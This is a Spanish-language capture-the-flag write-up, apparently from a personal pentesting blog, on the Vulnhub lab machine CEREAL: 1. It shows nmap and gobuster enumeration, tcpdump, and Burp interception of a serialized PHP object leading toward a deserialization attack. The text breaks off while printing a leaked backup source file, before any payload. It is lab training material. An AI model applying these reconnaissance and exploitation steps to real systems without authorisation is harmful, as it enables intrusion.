<!DOCTYPE html>
<head>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
    <link rel="icon" type="image/png" href="/images/LL2.png" />
<link rel="shortcut icon" type="image/png" href="/images/LL2.png" />

    
    
    <title>Rug4lo</title>
    
    
    <meta name="author" content="Rug4lo" /> 
     
    
    <meta name="description" content="Rug4lo&#39;s Website" /> 
    
    
    <meta name="keywords" content="Reconocimiento, PHP, Deserializacion" />
    
    <meta property="og:title" content="Vulnhub - CEREAL: 1" />
<meta property="og:description" content="Contenido Reconocimiento Explotación Reconocimiento Empezando con el típico escaneo de [[Nmap]] y exportamos todo el output a un archivo llamado allports
❯ nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128 # Nmap 7.93 scan initiated Wed Jul 26 16:21:16 2023 as: nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;) Host: 192.168.177.128 () Status: Up Host: 192." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://rug4lo.github.io/vlnh/2022/07/vulnhub-cereal-1/" /><meta property="article:section" content="vlnh" />
<meta property="article:published_time" content="2022-07-19T07:28:17+08:00" />
<meta property="article:modified_time" content="2022-07-19T07:28:17+08:00" />


    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Vulnhub - CEREAL: 1"/>
<meta name="twitter:description" content="Contenido Reconocimiento Explotación Reconocimiento Empezando con el típico escaneo de [[Nmap]] y exportamos todo el output a un archivo llamado allports
❯ nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128 # Nmap 7.93 scan initiated Wed Jul 26 16:21:16 2023 as: nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;) Host: 192.168.177.128 () Status: Up Host: 192."/>
<meta name="twitter:site" content="@onevcat"/>


    
    
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css" />
    
    

    
    
    <link rel="stylesheet" href="https://rug4lo.github.io/scss/main.min.adb360f36911df977062e96eb4e21330ce1615c54d3dd63c070161b63452c73b.css" integrity="sha256-rbNg82kR35dwYulutOITMM4WFcVNPdY8BwFhtjRSxzs=" crossorigin="anonymous" media="screen">
	<link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
</head>
  
</head>
<body>
  
  <header class="  panel-cover panel-cover--collapsed " style="background-image: url('/images/background-cover.jpg')">

    <div class="panel-main">
  
      <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">
  
          <a href="/#blog" title="Homepage of Rug4lo " class="blog-button"><img src="/images/avatar.jpg" width="80" alt="Rug4lo logo" class="panel-cover__logo logo" /></a>
          <h1 class="panel-cover__title panel-title"><a href="/#blog" title="Homepage of Rug4lo" class="blog-button">Rug4lo</a></h1>
          <hr class="panel-cover__divider" />
        <p class="panel-cover__description">Hacker  •  Red teamer  •  Pentester</p>
          <hr class="panel-cover__divider panel-cover__divider--secondary" /> 
          <div class="navigation-wrapper">
            <div>
              <nav class="cover-navigatio cover-navigation--primary">
                <ul class="navigation">
                  <li class="navigation__item"><a href="/writeups" title='Writeups' class="sblog-button">Writeups</a></li>
                  <li class="navigation__item"><a href="/blog" title='Blog' class="sblog-button">Blog</a></li>
                  <li class="navigation__item"><a href="/#whoami" title='Whoami' class="blog-button">About</a></li>
                </ul>
              </nav>
            </div>
              <div>
                <nav class="cover-navigatio cover-navigation--primary">
                  <ul class="navigation">
                    <li class="navigation__item"><a href="https://app.hackthebox.com/users/1478590" title="Rug4lo" target="_blank" class="sblog-button">HTB</a></li>
                    <li class="navigation__item"><a href="/" title='Home' class="sblog-button">Home</a></li>
                  </ul>
                </nav>
              </div>
            
            <div><nav class="cover-navigation navigation--social">
    <ul class="navigation">
  
    
    
    <li class="navigation__item">
      <a href="https://github.com/Rug4lo" title="Github" target="_blank">
        <i class='social fa fa-github'></i>
        <span class="label">Github</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="https://www.linkedin.com/in/ruben-garcia-lopez-055496279/" title="Linkedin" target="_blank">
        <i class='social fa fa-linkedin'></i>
        <span class="label">Linkedin</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="mailto:rubengarciavalladolid@gmail.com" title="Correo Electronico" target="_blank">
        <i class='social fa fa-envelope'></i>
        <span class="label">Email</span>
      </a>
    </li>
    
  
    </ul>
  </nav>
  </div>
          </div>
        </div>
      </div>
      
      
      <div class="panel-cover--overlay cover-red"></div>
      
    </div>
  </header>
  


  <div class="content-wrapper">
    <div class="content-wrapper__inner">

        
<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
    <header class="post-header">
        <br>
        <br>
        <h1 class="post-title">Vulnhub - CEREAL: 1</h1>
    </header>
    <section class="post">
        <h2 id="contenido">Contenido</h2>
<ul>
<li><a href="#Reconocimiento">Reconocimiento</a></li>
<li><a href="#Explotaci%C3%B3n">Explotación</a></li>
</ul>
<h2 id="Reconocimiento">Reconocimiento</h2>
<p>Empezando con el típico escaneo de [[Nmap]] y exportamos todo el output a un archivo llamado <strong>allports</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allPorts 192.168.177.128
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.93 scan initiated Wed Jul 26 16:21:16 2023 as: nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
</span></span><span style="display:flex;"><span>Host: 192.168.177.128 <span style="color:#f92672">()</span>        Status: Up
</span></span><span style="display:flex;"><span>Host: 192.168.177.128 <span style="color:#f92672">()</span>        Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 11111/open/tcp//vce///, 22222/open/tcp//easyengine///, 22223/open/tcp//unknown///, 33333/open/tcp//dgi-serv///, 33334/open/tcp//speedtrace///, 44441/open/tcp/////, 44444/open/tcp//cognex-dataman///, 55551/open/tcp/////, 55555/open/tcp//unknown///     Ignored State: closed <span style="color:#f92672">(</span>65520<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Wed Jul 26 16:21:18 2023 -- 1 IP address (1 host up) scanned in 1.94 seconds</span>
</span></span></code></pre></div><p>Posteriormente mandamos unos scripts de reconocimiento a los puertos abiertos, esto también lo exportaremos en un archivo llamado targeted</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.177.128 -oN targeted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.93 scan initiated Wed Jul 26 16:25:43 2023 as: nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 -oN targeted 192.168.177.128</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.177.128
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00076s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE         VERSION
</span></span><span style="display:flex;"><span>21/tcp    open  ftp             vsftpd 3.0.3
</span></span><span style="display:flex;"><span>| ftp-syst: 
</span></span><span style="display:flex;"><span>|   STAT: 
</span></span><span style="display:flex;"><span>| FTP server status:
</span></span><span style="display:flex;"><span>|      Connected to ::ffff:192.168.177.1
</span></span><span style="display:flex;"><span>|      Logged in as ftp
</span></span><span style="display:flex;"><span>|      TYPE: ASCII
</span></span><span style="display:flex;"><span>|      No session bandwidth limit
</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
</span></span><span style="display:flex;"><span>|      Control connection is plain text
</span></span><span style="display:flex;"><span>|      Data connections will be plain text
</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span style="display:flex;"><span>|_End of status
</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">6</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2021</span> pub
</span></span><span style="display:flex;"><span>22/tcp    open  ssh             OpenSSH 8.0 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 00242bae41baac52d15d4fad00ce3967 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 1ae3c737522edcdd62610327551a866f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 24fde78089c557fdf3e5c92f01e16b30 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp    open  http            Apache httpd 2.4.37 <span style="color:#f92672">(())</span>
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-title: Apache HTTP Server Test Page powered by: Rocky Linux
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.37 <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn?
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>3306/tcp  open  mysql?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   NULL, RTSPRequest: 
</span></span><span style="display:flex;"><span>|_    Host <span style="color:#e6db74">&#39;192.168.177.1&#39;</span> is not allowed to connect to this MariaDB server
</span></span><span style="display:flex;"><span>11111/tcp open  vce?
</span></span><span style="display:flex;"><span>22222/tcp open  easyengine?
</span></span><span style="display:flex;"><span>|_ssh-hostkey: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>22223/tcp open  unknown
</span></span><span style="display:flex;"><span>33333/tcp open  dgi-serv?
</span></span><span style="display:flex;"><span>33334/tcp open  speedtrace?
</span></span><span style="display:flex;"><span>44441/tcp open  http            Apache httpd 2.4.37 <span style="color:#f92672">(())</span>
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.37 <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html; charset=UTF-8).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">44444/tcp open  cognex-dataman?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">55551/tcp open  unknown
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">55555/tcp open  unknown
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port3306-TCP:V=7.93%I=7%D=7/26%Time=64C14908%P=x86_64-pc-linux-gnu%r(NU
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:LL,4C,&#34;H\0\0\x01\xffj\x04Host\x20&#39;</span>192<span style="color:#ae81ff">\.</span>168<span style="color:#ae81ff">\.</span>177<span style="color:#ae81ff">\.</span>1<span style="color:#e6db74">&#39;\x20is\x20not\x20all
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(RTSPReques
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t,4C,&#34;H\0\0\x01\xffj\x04Host\x20&#39;</span>192<span style="color:#ae81ff">\.</span>168<span style="color:#ae81ff">\.</span>177<span style="color:#ae81ff">\.</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20not<span style="color:#ae81ff">\x</span>20allo
</span></span><span style="display:flex;"><span>SF:wed<span style="color:#ae81ff">\x</span>20to<span style="color:#ae81ff">\x</span>20connect<span style="color:#ae81ff">\x</span>20to<span style="color:#ae81ff">\x</span>20this<span style="color:#ae81ff">\x</span>20MariaDB<span style="color:#ae81ff">\x</span>20server<span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Unix
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host script results:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_smb2-time: Protocol negotiation failed (SMB2)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Nmap done at Wed Jul 26 16:30:42 2023 -- 1 IP address (1 host up) scanned in 298.71 seconds
</span></span></span></code></pre></div><p>Ahora vamos a centrarnos en el puerto 80 que tiene un servidor Apache corriendo por detrás, y con Gobuster vamos a hacer un reconocimiento de directorios</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster dir -u http://192.168.177.128/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.177.128/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 16:42:22 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/blog                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 236<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.177.128/blog/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 237<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.177.128/admin/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>                                                                                   
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 16:42:52 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>Dentro de el directorio blog podemos usar Wappalyzer para ver que es un WordPress lo que esta corriendo por detrás</p>
<p>Como vemos mal el contenido podemos hacer un view-source de la pagina y ver que esta intentando sacar los recursos de un <a href="http://cereal.ctf">http://cereal.ctf</a> que nuestra maquina no puede acceder</p>
<p>Para solucionar esto nos vamos al /etc/hosts y añadirle esto (la ip es la de la maquina Cereal ):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.177.128 cereal.ctf
</span></span></code></pre></div><p>Ahora podemos aplicar un reconocimiento de subdominios en el puerto 44441 que también esta corriendo Apache (si lo haces en el puerto 80 no te aparecerá ningún subdominio)
<em>Es importante enumerar los dominios y subdominios de todos los puertos que tengan un servicion web corriendo por detras</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster vhost -u http://192.168.177.128/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:          http://cereal.ctf:44441
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:       GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:      <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:   gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:      10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 19:02:37 Starting gobuster in VHOST enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Found: secure.cereal.ctf:44441 <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1538<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>                                                         
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 19:02:40 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>Vemos que hay un subdominio mas, así que lo añadimos al /etc/hosts de la misma manera que antes</p>
<p>En este subdominio es donde vamos a hacer la explotación</p>
<h2 id="Explotación">Explotación</h2>
<p>Con Tcpdump podemos ponernos en escucha para captar todas las trazas icmp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo tcpdump -i vmnet1 icmp -n
</span></span></code></pre></div><p>Y en el panel de ping ponemos nuestra ip, para ver si nos manda trazas</p>
<p><img src="/vlnh/CEREAL:1/images/1.png" alt="CEREAL"></p>
<p>Podemos probar a inyectar varios comandos, pero esta bien sanitizado así que no podremos inyectar nada</p>
<p><img src="/vlnh/CEREAL:1/images/2.png" alt="CEREAL"></p>
<p>Viendo que no somos capaces de hacer nada en este panel, podemos usar Burpsuite pera interceptar la petición que mandamos al hacer un ping</p>
<p><img src="/vlnh/CEREAL:1/images/3.png" alt="CEREAL"></p>
<p>Aquí podremos ver como esta enviando un objeto a demás de la ip, si seleccionamos todo esto y hacemos un Cntrl + Shift + u para descodificarlo (esta en urlencode)</p>
<p>Podremos ver mas a detalle que tiene este objeto:</p>
<ul>
<li>El objeto tiene 8 caracteres (0:8) que son &ldquo;pingTest&rdquo;</li>
<li>Tiene una string de nueve caracteres (s:9) que es &ldquo;ipAddress&rdquo;</li>
</ul>
<p><img src="/vlnh/CEREAL:1/images/4.png" alt="CEREAL"></p>
<p>Sabiendo esto podemos intuir que están trabajando con una serializacion de objetos, así que podemos intentar un [[Deserialization Attack]]</p>
<p>Ahora tenemos que intentar encontrar algún archivo que nos de mas información de como se efectúa la deserializacion, para ello usaremos Gobuster otra vez pero esta vez en el puerto 44441 y con un diccionario mas grande</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster dir -u http://secure.cereal.ctf:44441 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://secure.cereal.ctf:44441
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 19:51:18 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/php                  <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3699<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/style                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3118<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1538<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/back_en              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 247<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://secure.cereal.ctf:44441/back_en/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>                                                                                             
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 19:57:09 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>Una vez encontrado el /back_en podemos listar archivos dentro de este directorio, (ya que no tenemos permiso para entrar a este directorio) e iremos probando distintas extensiones, al final la extension php.bak nos dará un archivo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span> -x php.bak
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://secure.cereal.ctf:44441/back_en
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php.bak
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 20:02:49 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/index.php.bak        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1814<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">14180</span> / <span style="color:#ae81ff">441122</span> <span style="color:#f92672">(</span>3.21%<span style="color:#f92672">)</span>               ^C
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Keyboard interrupt detected, terminating.
</span></span><span style="display:flex;"><span>                                                
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/07/26 20:02:52 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>Ahora podemos meternos dentro del código fuente del archivo index.php.bak y ver como funciona internamente la serializacion y deserializacion en este servidor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">pingTest</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> $ipAddress <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> $isValid <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>	
